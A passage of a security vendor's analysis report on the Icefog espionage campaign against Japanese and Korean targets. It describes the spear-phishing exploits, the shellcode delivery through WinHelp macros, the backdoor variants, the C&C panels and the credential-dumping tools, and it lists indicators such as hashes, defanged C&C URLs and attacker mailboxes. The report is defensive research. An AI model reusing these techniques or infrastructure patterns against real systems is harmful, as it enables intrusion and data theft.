<doc>
<cover>
►►THE ‘ICEFOG’ APT: A TALE
  OF CLOAK AND THREE
  DAGGERS
                          * “三尖刀” - also known as “three
                          daggers” or “three knives” is an
                          ancient Chinese weapon.




                K ASPERSK Y L AB GLOBAL RESE ARCH
                AND ANALYSIS TE AM (GRE AT )
                VERSION: 1.00




                            (C) 2013 KASPERSKY LAB ZAO
</cover>
                                                                                                                     <header>CONTENTS</header>



<toc>
    ►►CONTENTS
EXECUTIVE SUMMARY	��������������������������������������������������������������������������������������������������������3

ATTACK ANALYSIS 	��������������������������������������������������������������������������������������������������������������4
    >> Spear-phishing attacks - Microsoft Office exploits �������������������������������������������������������������������5
    >> Spear-phishing attacks - Java exploits�����������������������������������������������������������������������������������������9
    >> Spear-phishing attacks - HLP vector ���������������������������������������������������������������������������������������� 10
    >> Spear-phishing attacks - HWP vector���������������������������������������������������������������������������������������� 12
    >> Attackers’ “Modus Operandi” ���������������������������������������������������������������������������������������������������� 12
    >> Backdoor Information������������������������������������������������������������������������������������������������������������������ 13
    >> Lateral movement tools: ������������������������������������������������������������������������������������������������������������ 22

COMMAND AND CONTROL SERVERS	��������������������������������������������������������������������������������24
    >> C&C Servers Infrastructure�������������������������������������������������������������������������������������������������������� 25

INFECTION DATA AND STATISTICS	������������������������������������������������������������������������������������33
    >> Sinkhole Information�������������������������������������������������������������������������������������������������������������������� 34

ATTRIBUTION	��������������������������������������������������������������������������������������������������������������������39

MITIGATION INFORMATION 	����������������������������������������������������������������������������������������������42
    >> Indicators of Compromise (IOCs) ���������������������������������������������������������������������������������������������� 42

CONCLUSIONS	������������������������������������������������������������������������������������������������������������������49

APPENDIX A	���������������������������������������������������������������������������������������������������������������������� 51
    >> Malware MD5s������������������������������������������������������������������������������������������������������������������������������ 51

APPENDIX B	����������������������������������������������������������������������������������������������������������������������54
    >> Malware Technical Analysis�������������������������������������������������������������������������������������������������������� 54

APPENDIX C	����������������������������������������������������������������������������������������������������������������������60
    >> The Icefog-NG Bot Description �������������������������������������������������������������������������������������������������� 60

APPENDIX D	����������������������������������������������������������������������������������������������������������������������64
    >> The Macfog Bot Description ������������������������������������������������������������������������������������������������������ 64
</toc>



<footer>2</footer>

<header>EXECUTIVE SUMMARY</header>



<section>
  <heading>►►EXECUTIVE SUMMARY</heading>

“Icefog” is an Advanced Persistent Threat that has been active since at least 2011, targeting mostly
Japan and South Korea. Known targets include governmental institutions, military contractors,
maritime and shipbuilding groups, telecom operators, industrial and high-tech companies and
mass media.


The name “Icefog” comes from a string used in the command-and-control server name in one of the
samples. The command-and-control software is named “Dagger Three”, in the Chinese language.


The “Icefog” backdoor set (also known as “Fucobha”) is an interactive espionage tool that is directly
controlled by the attackers. There are versions for both Microsoft Windows and Mac OS X. In its latest
incarnation, Icefog doesn’t automatically exfiltrate data, instead, it is operated by the attackers to
perform actions directly on the victim’s live systems.


During Icefog attacks, several other malicious tools and backdoors were uploaded to the victims’
machines, for data exfiltration and lateral movement. This document includes a description
of the backdoors, other malicious tools, together with remediation information. (“Indicators of
compromise”)
</section>



<footer>3</footer>
 
<header>ATTACK ANALYSIS</header>



<section>
    <heading>►►ATTACK ANALYSIS</heading>
The Icefog targeted attacks rely on spear-phishing e-mails that attempt to trick the victim into
opening a malicious attachment or a website.


During our investigation, we identified several types of exploits being used through spear-phishing
e-mails against the targets:

    >>	CVE-2012-1856 (the “Tran Duy Linh” (also see: http://blog.malwaretracker.com/2013/06/
      tomato-garden-campaign-possible.html) exploit fixed in Microsoft’s MS12-060 security
      bulletin)

    >>	CVE-2012-0158 (the MSCOMCTL.OCX remote code execution vulnerability fixed with
      Microsoft’s MS12-027 security bulletin)

    >>	Web links to Oracle Java exploits (CVE-2013-0422 and CVE-2012-1723)

    >>	HLP exploits and abuse of features

    >>	HWP exploits

The first two vulnerabilities are exploited through Microsoft Office documents (Word and Excel) that
drop and execute the backdoor and show a fake “lure” document to the victim. These appear to be
the most common methods used by the attackers at this moment.
</section>



<footer>4</footer>

<header>Attack Analysis</header>


<section>
    <heading>SPEAR-PHISHING ATTACKS - MICROSOFT OFFICE EXPLOITS</heading>

The victim receives an e-mail with an attachment that is either a Word (.doc) or Excel (.xls) file.



                                           EXAMPLE ‘A’
 <table>                                          

                    MD5                                FILENAME                KASPERSKY NAME
 b8bed65865ddecbd22efff0970b97321             E-mail message               Exploit.MSWord.CVE-2012-
                                                                           0158.bu
 5f1344d8375b449f77d4d8ecfcdeda9a             “AKB48 Sashihara Rino        Exploit.MSWord.CVE-2012-
                                              was super cheetah (with      0158.bu
                                              picture). Doc based on his
                                              confession”
 9de808b3147ec72468a5aec4b2c38c20             Temporary dropper            Backdoor.Win32.CMDer.ct
 120f9ed8431a24c14b60003260930c37             wdmaud.drv                   Backdoor.Win32.CMDer.ct

</table>
The attachment is a standard “Tran Duy Linh” exploit for CVE-2012-1856.


<figure></figure>

<caption>Sample Icefog spear-phishing e-mail</caption>




<footer>5</footer>
                                                                                 
<header>ATTACK ANALYSIS</header>



Upon successful execution, the exploit displays a decoy document featuring a picture of a scantily
clad woman:


<figure></figure>

<caption>Sample Icefog spear-phishing e-mail</caption>


                                         EXAMPLE ‘B’
<table>                                         

                    MD5                         FILENAME              KASPERSKY NAME
 32e8d4b2f08aff883c8016b7ebd7c85b             Name varies    Exploit.MSWord.CVE-2012-0158.u
 d544a65f0148e59ceca38c579533d040             n/a            Trojan-Downloader.Win32.Agent.wqqz
 9a64277e40e3db8659d359126c840897             wdmaud.drv     Trojan-Downloader.Win32.Agent.wqqz

</table>


<footer>6</footer>

<header>Attack Analysis</header>


Upon successful execution, this shows a clean, fake “lure” document in Japanese titled “Little enthusiasm
for regional sovereignty reform”:

<figure></figure>
<caption>Sample Icefog spear-phishing e-mail</caption>


                                             EXAMPLE ‘C’
<table>                                             


                     MD5                              FILENAME                  KASPERSKY NAME
 61ed85d28eb18b13223e033a01cb5c05               量産用材料の件.eml              Exploit.MSWord.CVE-2012-
                                                / Reviews for mass       0158.az
                                                production material
 43edcbd20bb5fec2c2d36e7c01d49fc7               20130128.xls             Exploit.MSWord.CVE-2012-
                                                                         0158.az

</table>


<footer>7</footer>
                                                                      
<header>ATTACK ANALYSIS</header>


This is a business e-mail in Japanese:

<figure></figure>


                                                                             	
  

The same malware was used to spear-phish multiple targets in Japan.
Another example (d6c90955c6f2a346c9c91be82a1f9d8c) looks like this:


<figure></figure>

                                                                           	
  
</section>



<footer>8</footer>

<header>Attack Analysis</header>


<section>
  <heading>SPEAR-PHISHING ATTACKS - JAVA EXPLOITS</heading>


In addition to Microsoft Office exploits, the Icefog attackers are known to be using Java exploits, hosted
online.

For instance, one of the malicious websites used in the attacks was “money.cnnpolicy.com”. The Java exploit
downloaded and executed an Icefog dropper from the following URL:

        www.securimalware[dot]net/info/update.exe

Note: This website is now SINKHOLED by Kaspersky Lab.

The “update.exe” is a standard Icefog dropper, with the following information:
<table>
                     MD5                             COMPILEDON                   KASPERSKY NAME
 78d9ac9954516ac096992cf654caa1fc               2012-07-26 03:10:51        Trojan-Downloader.Win32.Agent.
                                                                           gzda
</table>                                                                           

Upon execution, it installs the Icefog malware as “sxs.dll” in the Internet Explorer folder (usually “C:\
Program Files\Internet Explorer”):
<table>

                     MD5                             COMPILEDON                   KASPERSKY NAME
 387ae1e56fa48ec50a46394cc51acce7               2012-07-26 03:10:48        Trojan-Downloader.Win32.Agent.
                                                                           xsub
</table>

To receive control, the malware DLL (“sxs.dll”) uses a technique known as “DLL search order
hijacking”, which abuses the fact that Internet Explorer will load this file from its own directory,
instead of the Windows SYSTEM folder.


The backdoor beams out to the command-and-control server at www.setchon[dot]com/jd/
upload.aspx

</section>


<footer>9</footer>
                                                                                        
<header>ATTACK ANALYSIS</header>


<section>
  <heading>SPEAR-PHISHING ATTACKS - HLP VECTOR</heading>

The Icefog attackers are also using HLP files to infect their targets. The HLP files do not contain
exploits but they are abusing certain Windows “features” to drop the malware.


It’s interesting to know that Icefog is not the only crew to heavily use HLP “exploits” as a part of their
toolkit. Well known, very effective APT like the “Comments Crew” / APT1, have included the HLP
trick in their kits, along with other lesser known crews.


This HLP format is an older one, known as “Winhelp”, which was natively supported up until Vista
and Windows 7, when Microsoft shipped a separate Winhlp32.exe component to help phase out
the technology. Most likely, the choice to abuse Winhelp indicates that the attackers have an idea
of what version operating systems they are attacking.


In very conservative terms, this implementation of HLP files is not an “exploit”, but instead, abuse
of a poorly constructed Windows Help feature. Code and data is mixed in this file format, and the
Icefog attackers abused it with custom macros.


A fine description of “custom macros” and the risks of building them in to WinHelp projects is
provided by Ruben Santamarta: http://reversemode.com/index2.php?option=com_content&do_
pdf=1&id=4



                                              EXAMPLES
<table>                                              

                     MD5                             FILENAME                KASPERSKY NAME
 0b28d3cc9e89ffe53dbb50f739fcb6e3               Q&A.hlp              Exploit.WinHLP.Agent.d
 4482fd69a07ab15d9a9d3b3819d048be               츮.hlp                Exploit.WinHLP.Agent.d

</table>

Let’s take a quick look at an example of how the Icefog attackers abused the provided WinHelp
functionality by examining the relevant custom macros, API calls and shellcode.




<footer>10</footer>

<header>Attack Analysis</header>



This sample uses standard Win32 API to allocate memory with the execution flag set, copies(using
long string copy) XOR’ed “shellcode” and calls CreateThread to transfer execution to the malicious
payload.


<figure></figure>

                                                                                                 	
  

In the screenshot above, “RR” means RegisterRoutine.


After registration, one can simply call the respective function.


<figure></figure>

                                                                                                     	
  
Next, the sample allocates memory with execution flag , and copies XOR’ed “shellcode” . To execute
the code, a simple call to CreateThread( ) suffices:


<figure></figure>

                                                                                                 	
  
The shellcode is encrypted with a simple 0xBF XOR operation:

<figure></figure>


                                                                                                     	
  

Upon execution, the shellcode installs an Icefog backdoor that communicates with the C2s at:
“www.samyongonc[dot]com/jd/upload.aspx” and “www.625tongyi[dot]com/jd/upload.aspx”

</section>


<footer>11</footer>
                                                                                    
<header>ATTACK ANALYSIS</header>

<section>

  <heading>SPEAR-PHISHING ATTACKS - HWP VECTOR</heading>

During our investigation, we observed Icefog attacks using HWP files. These are document files
used by the Hangul Word Processor. According to Wikipedia, Hangul (also known as Hangul Word
Processor or HWP) is a proprietary word processing application (link to: http://en.wikipedia.org/
wiki/Hangul_(word_processor)) published by the South Korean company Hancom Inc. It is used
extensively in South Korea, especially in the government sector.


Unfortunately, we were not able to obtain any of these files, although they were used to successfully
attack and infect victims.


Users of HWP should be aware of these exploits and update their Hangul Word Processor installation
to the most recent version.
</section>

<section>
  <heading>ATTACKERS’ “MODUS OPERANDI”</heading>

The attack is initiated through spear-phishing e-mails, taking advantage of multiple known (already
patched) vulnerabilities. Once they successfully infect a machine, the operators perform several
basic functions to identify and confirm the nature of the victim:

  >>List folders on disk such as “My Documents” and the Desktop.

  >>List adapters and IP configurations.

  >>Get information about the victim and their network.

If the victims looks “genuine” (they avoid working with virtual machines and “fake” victims) they
further deploy additional software, including:

  >>Type “2” backdoors that use a newer protocol for communication.

  >>Lateral movement tools such as:

         • Password and hash dumping tools.
         • Tools to dump Internet Explorer saved passwords.
         • Tools to dump Outlook e-mail accounts and passwords.
         • Debugging tools.


<footer>12</footer>

<header>Attack Analysis</header>


        • The legitimate “RAR” program to compress stolen data.

We have documented three main types of stolen data:

  >>Windows address books, .WAB files.

  >>Documents, including HWP, XLS and DOC files.

  >>User account credentials.

If stolen information represents large files, they are compressed with the popular tool WinRAR (split
into volumes) or CABARC and transferred to the command-and-control part by part.

</section>
<section>
  <heading>BACKDOOR INFORMATION</heading>

Several known variants of the Icefog backdoor are known to exist. We list these as following:

  >>The “old” 2011 Icefog — which sends stolen data by e-mail; this version was used against
    the Japanese House of Representatives and the House of Councillors in 2011.

  >>Type “1” “normal” Icefog — which interacts with command-and-control servers.

  >>Type “2” Icefog — which interacts with a script-based proxy server that redirects commands
    from the attackers to another machine.

  >>Type “3” Icefog — We don’t have a sample of this variant but we observed a certain kind of
    C&C that uses a different communication method; we suspect there are victims infected
    with this malware.

  >>Type “4” Icefog — same situation as “type 3”.

  >>Icefog-NG — which communicates by direct TCP connection to port 5600.

</section>


<footer>13</footer>
                                                                                  
<header>ATTACK ANALYSIS</header>

<section>
  <heading>THE OLD “2011” ICEFOG</heading>

Back in 2011, we analyzed malware samples that were used to attack several Japanese
organizations. Among of the attacked organizations were the Japanese “House of Representatives”
and the “House of Councilors”.
<table>

                   MD5                         COMPILEDON                 KASPERSKY NAME
 6d3d95137ef1ba5c6e15a4a95de8a546          2011-08-05 16:44:30     Trojan-Spy.Win32.Agent.bxeo
 a72d3774d2d97a7eeb164c6c5768f52a          2011-07-22 20:54:16     Trojan-PSW.Win32.MailStealer.j
 </table>

Both samples beacon out to the C&C at “www.cloudsbit.com”, although to different scripts: “/dj/
upload.aspx” and “/jd2web/upload.aspx”.

In addition to the normal command-and-control mechanism, these older samples feature another
capability, which involves e-mail accounts on AOL.COM:

       harrypottercommand001@aol.com
       jd2command092@aol.com
       jd2clientsend@aol.com
       woshihero009@aol.com
       mrmylcmd009@aol.com
       defaultmail002@aol.com

The malware has the ability to connect to these accounts by POP3 and fetch commands from
the mailbox. It also has the ability to send stolen data by e-mail, by contacting smtp.aol.com and
sending e-mail messages directly.

Here’s what such a session looks like:
<figure></figure>



<footer>14</footer>

<header>Attack Analysis</header>




One of the samples used in the attacks drops a “lure” photo depicting a Japanese audience:

<figure></figure>


                                                                                                      	
  
<box> Note: the faces of the people in the photo above have been blurred in accordance to the
                       “Japanese Portrait Rights” (肖像権(しょうぞうけん) regulations
</box>  

Of the e-mail accounts used by the backdoor, one of them was interesting: woshihero009[at]
aol.com

Back in August 2011, when these attacks took place, this mailbox had several hundred e-mails
with stolen information from the victims.

<figure></figure>


                                                                                                    	
  
<footer>15</footer>
                                                                                         
<header>ATTACK ANALYSIS</header>



Interestingly, their address book contained a number of e-mail addresses to which e-mails were
forwarded and were automatically added to the address book.

<figure></figure>


                                                                                               	
  

<box>
Note: More information about the attackers and the older “2011” Icefog incident is available in our
private report.
</box>
</section>
<section>
<heading>TYPE “1” ICEFOG</heading>
 <table>                                          

                         MD5                        COMPILEDON                  KASPERSKY NAME
 2a106c694660891e0950493e3eedc42d 2013-06-19 12:43:17                    Trojan-Downloader.Win32.Agent.
                                                                         yium
</table>                                                                         

The Icefog type “1” backdoor is a remotely controlled Trojan that supports a variety of functions.
Versions of this backdoor are available for Microsoft Windows and Mac OS X.


It has the ability to:

  >>Hijack and upload basic system information to C&C servers owned and controlled by the
     attackers.

  >>Give the attackers access to push and run commands on the infected system.

  >>Steal and upload files from the victims to the command-and-control servers.

  >>Download files (tools) from the C&C servers to the infected computers.

  >>Give access to the attackers to directly execute SQL commands on any MSSQL servers in
     the network.

For a technical description of the type “1” Icefog backdoor, see Appendix B.

</section>


<footer>16</footer>

<header>Attack Analysis</header>

<section>
  <heading>TYPE “2” ICEFOG</heading>

The type “2” Icefog backdoor is very similar to type 1. However it uses a proxy server for the
commands. This behavior relies on a set of ASP scripts, which act as a buffer between the real C&C
backend and the victim. It offers another level of anonymity to the attackers, as it can be controlled
(for instance) via Tor or another anonymizing method.


We haven’t observed the use of Type “2” backdoors directly against the victims. Instead, the type
“2” backdoor is used as an upgrade to Type “1” infections, together with a special loader tool.


It uses a script named “alive.asp” for most of the operations.
(example C&C URL: www.chinauswatch[dot]net/test/space.asp - SINKHOLED by Kaspersky
Lab).

<figure></figure>

<caption>Icefog Type “2” C&C scripts</caption>




<footer>17</footer>
                                                                                         
<header>ATTACK ANALYSIS</header>



Type “2” Icefog exists as shellcode files, usually named “msuc.dat”. These are loaded through the
use of a special tool.
<table>
                    MD5                          FILENAME                  KASPERSKY NAME
 324d26f4fb7a91b8019c19e6a0318400             msuc.dat           Trojan.Win32.Icefog.a
 aa97368c43171a5c93c57327d5da04cf             msuc.dat           Trojan.Win32.Icefog.a
</table>

Loaders:
<table>
                    MD5                               FILENAME                  KASPERSKY NAME
 d22ab2a2f9e4763a35eb7c6db144d3d4             msld.exe                     Trojan.Win32.Icefog_loader

 ffef41bd67de8806ac2d0e10a3cab3c2             暗流服务端代码片调用程                  Trojan.Win32.Icefog_loader
                                              序.exe.jpg (“Undercurrent
                                              server code piece calling
                                              program”)
 be043b0d1337f85cfd05f786eaf4f942             通信模块代码片                      Trojan.Win32.Icefog_loader
                                              调用专用.exe.jpg
                                              (“Communication module
                                              code sheet invoking
                                              special.Exe.jpg”)
</table>

In terms of functionality, type “2” Icefog is similar to type “1”. The only difference is that the malware
does not have persistence in the system and disappears after reboot.
</section>

<section>
  <heading>TYPE “3” AND “4” ICEFOG</heading>

Although we don’t have samples of these variants, we observed and sinkholed a certain kind of
Icefog-related command-and-controls that use a different communication method; we suspect
there are victims that are infected with this malware.


Type “3” Icefog uses scripts named “view.asp” and “update.asp”. Known C&C URLs:


      www.krentertainly[dot]net/web/view.asp
      disneyland.website.iiswan[dot]com/web/view.asp


Type “4” Icefog uses scripts named “upfile.asp”. Known C&C URL:


      www.pinganw[dot]org/sugers/upfile.asp - SINKHOLED by Kaspersky Lab)



<footer>18</footer>

<header>Attack Analysis</header>



We continue to look for these variants and will update the paper when or if they are identified.

</section>
<section>
  <heading>TYPE “NG” ICEFOG</heading>

Type “NG” Icefog is the most recent version of this backdoor. It is designed to communicate directly
with a command-and-control software that runs on Microsoft Windows computers.


For a thorough technical description of the type “1” Icefog backdoor, see Appendix C.
</section>

<section>
  <heading>MACFOG - THE MAC OS X VERSION OF ICEFOG</heading>

In late 2012, the Icefog attackers experimented with a Mac OS X version of Icefog. This particular
version of the malware was seeded in a number of Chinese BBS forums and masked as a graphic
application.


Here is an example: http://bbs.pcbeta.com/forum.php?mod=viewthread&tid=1157944
&page=1#pid30109870


On 19 October 2012, the user “appstoer” advertised an application named “Img2icns.rar”.


<figure></figure>

                                                                                        	
  

The archive contains a Mac OS X application that drops and installs the Macfog malware. We were
able to find two such archives, but there are probably more.



<footer>19</footer>
                                                                                    
<header>ATTACK ANALYSIS</header>

<table>

                   MD5                              FILENAME                        SIZE
 126c6b7f5be186fd48bb975f7e59385e           Img2icns.zip                5,283,638
 ff27ebb3696e075e339195a2833caa47           Img2icns.zip                5,285,456
</table>

The malicious modules have the following identification data:
<table>
                    MD5                         FILENAME           SIZE        KASPERSKY NAME
 cf1815491d41202eb8647341a8695e1e            launchd           32,768        Trojan.OSX.Macfog.a
 336de9428650c46b64ff699ab4a441bb            launchd           23,084        Trojan.OSX.Macfog.a
 9f422bb6c00bb46fbfa3918ae3e9447a            Img2icns          23,236        Trojan.OSX.Macfog.a
</table>

The Macfog backdoor is a 64-bit Apple Mac OS X Mach-O executable, compiled with the LLVM Clang
package. It uses the type “1” C&C servers protocol to communicate and has the same capabilities
as the Windows version. We are including a brief description below; a full description of the malware
is available in Appendix D:


                                MACFOG: SUMMARY DESCRIPTION


The Macfog backdoor is very similar to its Win32 siblings. It collects unique system information and
POSTs this data to a hardcoded URL:


hxxp://appst0re.net/upload.aspx?filepath=%order/ok/arbitrary
name%&filename=%hostname%.jpg


<figure></figure>

                                                                                                    	
  




<footer>20</footer>

<header>Attack Analysis</header>



The backdoor is capable of familiar functionalities: system information collection, communication
over HTTP with the C&C, download and upload files and execute system commands.



<figure></figure>
                                                                                                    	
 <caption>Macfog C&C configuration data</caption>


The Macfog backdoor is different from the Windows variant from the point of view of usage by the
attackers. So far, we haven’t identified victims of targeted attacks being infected with it, although
we do believe they exist. The seeding of this version through Chinese bulletin boards resulted in a
few hundred infections worldwide. We believe this could have been a beta-testing phase for Mac
OS X versions to be used in targeted attacks later.

</section>


<footer>21</footer>
                                                                                      
<header>ATTACK ANALYSIS</header>


<section>
  <heading>LATERAL MOVEMENT TOOLS:</heading>

The attackers rely on a multitude of lateral movement tools that are deployed to the victims through
the command-and-control servers. The tools we observed cover a variety of functions, such as
dumping Windows user credentials, Outlook and Internet Explorer saved passwords, and the
gathering of system information.


One of the servers we analyzed had an open folder where some of the filenames of the lateral
movement tools were still visible, although most were truncated to 0 by the C&C upon successful
execution on the victim:

<figure></figure>

<caption>Folder with lateral movement tools on a command-and-control server</caption>

A description of some of the tools we observed follows:
<table>
                   MD5                           FILENAME                    DESCRIPTION
 d53cec579c7b3b3e0f77cd64e0c58bbf           console.exe.jpg       Server backend of Icefog-NG
 00c3d59a83c3745498b75fd9d1067b4c           Dbgview.exe.jpg       Sysinternals’s Dbgview
 9d3d8504cd488acaa731cfdd48fe5851-          hush获取.exe.jpg        Known Windows hashes dumping
                                                                  tool “quarks-pwdump.exe”
 ffef41bd67de8806ac2d0e10a3cab3c2           暗流服务端代码               Loader for type “2” Icefog
                                            片调用程序.exe.
                                            jpg (“Undercurrent
                                            server code piece
                                            calling program”)
 be043b0d1337f85cfd05f786eaf4f942           通信模块代码片               Loader for type “2” Icefog
                                            调用专用.exe.jpg
                                            (“Communication
                                            module code sheet
                                            invoking special.
                                            Exe.jpg”)
 95ee545a6562a81c3e049a48c5b9f8aa           freespi.cab.cab       Small tool which lists and deletes
                                                                  Winsock providers. Icefog uses
                                                                  Winsock providers for persistence,
                                                                  so it is used by the attackers during
                                                                  upgrade to a newer version of the
                                                                  malware.
</table>
<footer>22</footer>

<header>Attack Analysis</header>



In addition to these, several other tools were observed but not recovered. For instance, on one of
the victim machines, we observed what appeared to be the use of a Kernel exploit through a Java
application for escalation of privileges. Unfortunately, we do not know if it was a zero-day kernel
vulnerability because the file was deleted by the attackers after being used.

</section>


<footer>23</footer>
                                                               
<header>COMMAND AND CONTROL SERVERS</header>



<section>
  <heading>►►COMMAND AND CONTROL
     SERVERS</heading>
During our research, we observed multiple Icefog command and control servers. Most of them
were on shared hosting platforms, however, some of them, which were of greater importance to the
attackers, were also using dedicated hosting.


Perhaps one of the most important aspects
of the Icefog C&Cs is the “hit and run” nature.
The attackers would set up a C&C, create a
malware sample that uses it, attack the victim,
infect it, and communicate with the victim
machine before moving on. The shared hosting
would expire in a month or two and the C&C
disappears.


The nature of the attacks was also very focused
- in many cases, the attackers already knew
what they were looking for. The filenames were
quickly identified, archived, transferred to the
C&C and then the victim was abandoned.


Based on the C&C names, we were able to
identify several Icefog campaigns that were
active between 2011-2013.


From the timeline above, it seems the attackers
increased the number of campaigns in 2013
compared to previous years, although it’s
possible that malware and artifacts used in
earlier years are no longer available. Hence, the
chart probably represents only a fraction of the
attackers’ activity during the past years.

<figure></figure>
</section>
<footer>24</footer>

<header>Command and Control servers</header>

<section>

  <heading>C&C SERVERS INFRASTRUCTURE</heading>

We identified four types of Icefog C&C servers - type “1”, “2”, “3” and type “4”. Also, there is a fifth,
standalone type of C&C, used for Icefog-NG, which runs as a Windows desktop application.


The type “1” C&C server uses a full web backend that lets the attacker directly control the victims
via a web browser. The type “1” C2 backend is written in ASP.NET.


The type “2” C&C server backend we identified acts as a virtual, custom proxy between the attackers
and the victims. It is written in ASP and is extremely simplistic in operation. This is more effective as
it conceals the attacker’s identity. The second type of C2 works in conjunction with a control tool,
probably running directly on the attacker’s PC.


The type “3” C&C server (used in the “starwings” and “disneyland” campaigns) appears to be
experimental and features only two basic functions: view and update. Its exact workings are unknown
and we haven’t been able to locate the Icefog malware that uses it.


The type “4” C&C server was identified through sinkholing of the domain “pinganw[dot]org”. (known
C2 URL - www.pinganw[dot]org/sugers/upfile.asp). Just like type “3”, the exact workings are
unknown and we haven’t been able to locate the Icefog malware that uses it.


The Icefog-NG C&C server is a Windows desktop application which doesn’t require a web server and
works as a standalone TCP server, which by default listens on port 5600.


Our analysis focuses on type “1” C&C servers, which are the most popular and have been used in
most of the attacks we observed.




<footer>25</footer>
                                                                      
<header>COMMAND AND CONTROL SERVERS</header>



Here’s a look at the type “1” command-and-control server login screen:


<figure></figure>

                                                                                                        	
  
The command-and-control script (“control.aspx”) features an interesting comment
“shiyanlllllllllllllllllllllllllll”. The page title is “尖刀三号”, which means “Dagger Three” in Chinese.


<figure></figure>

                                                                                                        	
  

<footer>26</footer>

<header>Command and Control servers</header>



For martial arts fans, the “尖刀三号” is quite similar to “三尖刀”, which is an ancient Chinese weapon.


The Type “1” C2 interface is written in ASP.NET and features an easy to use interface to communicate
with and manage the victims:


<figure></figure>

<caption>The “ManageSystem” C&C user interface (type “1”)</caption>

This control panel is actually a Visual Basic.NET web application with the following structure:


<figure></figure>

                                                                                      	
  


<footer>27</footer>
                                                                   
<header>COMMAND AND CONTROL SERVERS</header>



The application uses the native filesystem as the main storage to save stolen data, logs and
temporary files. Below is short description of directories used by the C&C application:
<table>

 ok:                               “heartbeat” files with dates that indicate the last time a victim
                                   was online.

 downloads:                        files that were transferred from the victim at the request of the
                                   operator.

 uploads:                          files that should be pushed to the victim systems.

 order:                            files containing instructions or commands that are to be
                                   executed on the victims’ machines.

 result:                           The result of command execution on the victims’ machines.

 info:                             basic information about the victims’ systems.

 logs:                             operator interaction logs, can be erased on request by the
                                   operator.

 files:                            additional files, including JavaScript, CSS and images used by
                                   Control Panel web user interface.
</table>

Perhaps the most interesting part is that the type “1” C&C panel maintains a full history of the
attacker’s interaction with the victims. This is kept as an encrypted logfile, in the “logs” directory
on the server. In addition to that, the server maintains full interaction logs and command execution
results from each victim.




<footer>28</footer>

<header>Command and Control servers</header>



Below we can see an example of the attackers copying a number of files to “c:\temp\mslog” from
an USB flash drive connected to the computer with Korean Windows systems and preparing them
for upload to the C2:


<figure></figure>

                                                                                	
  


In another example, we can see them uploading and running a type “2” backdoor on top of the type
“1” infection:


<figure></figure>

<footer>29</footer>
                                                                 
<header>COMMAND AND CONTROL SERVERS</header>

<figure></figure>


 Interestingly, the modern Icefog-NG C&C application looks very similar to Icefog Web UI - it uses
 the same multi-tab layout and even has the same tab titles. We believe that Icefog-NG was
 developed by the same author to replace Icefog bot and the web-based Control Panels.


<figure></figure>

<caption>Icefog-NG File Control tab</caption>




<footer>30</footer>

<header>Command and Control servers</header>



Icefog-NG was designed to be more responsive and convenient to the operator. The data storage is
the same - local filesystem, and even the file names are the same as on the previous Icefog version.
Here is a screenshot of the user interface from the Icefog-NG C&C application.


<figure></figure>

<caption>Icefog-NG login prompt</caption>

Like with the web-based Icefog, this C&C application requires authorization of the operator. While
in the web version it made sense to authenticate remote users to restrict access to the Control
Panel, the desktop application authentication is easily bypassed, because the login and password
are hardcoded in the binary.


Here’s a look at the “victims” panel in the Icefog-NG C&C software:


<figure></figure>

<caption>Icefog-NG UI layout optimized for a screen resolution of 1280x1024</caption>


<footer>31</footer>
                                                                
<header>COMMAND AND CONTROL SERVERS</header>



One curious fact about Icefog-NG is that it is usable only if you have screen resolution set at
1280x1024 or higher. Even on standard 1024x768, not all controls fit into screen. The application
was created using Microsoft Visual Studio MFC AppWizard. Although, the sample we analyzed
was compiled in May 2013, the project was most likely started in 2012, which is stated in the
“About Application” message box. This date is put automatically by the AppWizard when the code
is generated for the first time.

</section>


<footer>32</footer>

<header>Infection data and statistics</header>


<section>

  <heading>►►INFECTION DATA AND
  STATISTICS</heading>
The command-and-control servers maintain full logs of the victims together with the various
operations performed on them by the C&C operators. These logs are encrypted with a simple XOR
operation and available to anyone who knows their location and name on the server. Here’s what a
decoded log looks like:



<figure></figure>
                                                                                                   	
 <caption>Sample C&C activity log</caption>

These logs can sometimes help to identify the targets of the attacks and in some cases, the victims.


During our research, we observed attacks against a number of targets in South Korea, Taiwan
and Japan. These include defense industry contractors such as Lig Nex1 and Selectron Industrial
Company, shipbuilding companies such as DSME Tech, Hanjin Heavy Industries, telecom operators
such as Korea Telecom, media companies such as Fuji TV and the Japan-China Economic Association.



<figure></figure> <figure></figure> <figure></figure>                        	
  
                                                                     	
 <caption>Some organizations that the attackers were interested in targeting</caption>
 </section>                                                                                                      	
  
<footer>33</footer>
                                                                    
<header>INFECTION DATA AND STATISTICS</header>

<section>
<heading>SINKHOLE INFORMATION</heading>

During our research, we managed to sinkhole 13 domains used by the attackers:

  >>spekosoft.com

  >>kechospital.com

  >>unikorean.com

  >>pasakosoft.net

  >>chinauswatch.net

  >>msvistastar.com

  >>defenseasia.net

  >>pinganw.org

  >>kevinsw.net

  >>avatime.net

  >>shinebay.net

  >>securimalware.net - used in spear-phishing attacks

  >>appst0re.net - MacFog’s command-and-control

All of them have been redirected to the Kaspersky Sinkhole server at 95.211.172.143.


Overall, during the monitoring period, we observed connections from several victims, based in South
Korea, Japan, Taiwan, Germany and some other countries.




<footer>34</footer>

<header>Infection data and statistics</header>



For Windows based computers, we have the following statistics:

<figure></figure>

<caption>Distribution by number of hits in our sinkhole (percentage)</caption>


<figure></figure>
  <caption>Distribution by number of hits in our sinkhole (absolute values)</caption>




<footer>35</footer>
                                                            
<header>INFECTION DATA AND STATISTICS</header>

.

<figure></figure>
  <caption>Distribution by number of IPs in our sinkhole (percentage)</caption>


<figure></figure>

     <caption>Distribution by country by number of IPs in our sinkhole (percentage)</caption>




<footer>36</footer>

<header>Infection data and statistics</header>



For Macfog, the Mac OS X version of the backdoor, we have the following statistics:

<figure></figure>

  <caption>Distribution by number of IPs in our sinkhole (percentage)</caption>


<figure></figure>

  <caption>Distribution by number of IPs in our sinkhole (absolute values)</caption>

Overall, we’ve observed over 4500 IPs with infected Macfog hosts, belonging to more than 430
unique victims.

<footer>37</footer>
                                                                     
<header>INFECTION DATA AND STATISTICS</header>



For Windows-based machines, our sinkhole received connections from almost 200 unique IPs, in
six countries.


It should be noted that in terms of the overall picture, these sinkholed domains offer a view of only
a fraction of the infected computers, especially old infections which for some reason have not yet
been disinfected. The newer attacks are more difficult to track because they use new C&C domains
that can’t be easily sinkholed.


Another important note relates to geographical distribution of victims. While we see many
connections coming from China, this doesn’t mean that it has victims of targeted attacks. Because
the Macfog samples that we have seen are being distributed in a trojanized bundle with legitimate
software on publicly available Chinese message boards, visitors (especially those who read Chinese)
from any country in the world could get infected. We believe that a primary goal of doing that was
